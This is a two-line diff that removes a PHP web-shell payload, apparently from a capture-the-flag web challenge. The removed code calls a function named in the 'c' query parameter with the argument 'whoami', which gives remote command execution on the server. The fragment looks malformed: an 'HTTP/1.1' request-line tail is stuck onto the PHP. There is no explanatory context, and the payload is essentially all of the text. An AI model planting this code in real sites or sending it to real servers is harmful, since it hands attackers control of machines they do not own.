@@ -1,2 +1,0 @@
-<?=// a.k.a test
- $_GET /*WH_GP_web200/index.php/?*/['c']('whoami');?> HTTP/1.1
